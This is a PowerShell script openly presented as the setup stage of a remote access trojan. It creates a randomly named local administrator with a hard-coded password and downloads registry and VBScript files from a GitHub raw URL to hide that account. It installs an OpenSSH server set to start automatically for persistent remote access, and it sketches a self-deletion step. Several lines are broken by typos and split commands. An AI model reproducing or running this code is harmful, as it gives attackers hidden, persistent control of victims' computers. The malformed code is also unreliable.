# builds resources for RAT

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

#create admin for rat
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname" -pword $pword
        -FullName "$uname" -Description
        "Temporary local admin"
        Write-Verbose "$uname local user created"
        Add-LocalGroupmember -LocalGroupmember
        "Administrators" -Member "$uname"
    }
    end {
    }
}

# create admin user
$uname = random_text
$pword = (ConvertTo-SecureString "OnlyRat123"
AsPlainText -Force)
create_account -uname $uname -pword $pword

# registry to hide  local admin
$reg_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Dukk3D3nnis/resources/refs/heads/main/admin.reg -OutFile "$reg_file.reg"

#visual basic scrit to download the registry
$vbs_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Dukk3D3nnis/resources/refs/heads/main/confirm.vbs -OutFile "$vbs_file.vbs"

#install the registry
./"$reg_file.reg";"vbs_file.vbs"

## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# embedding persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.
Server~~~~0.0.1.0
Staer-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

#goto temp, make working dir
mkdir $path
cd $path

# self delete
cd $initial_dir
# del installer.ps1

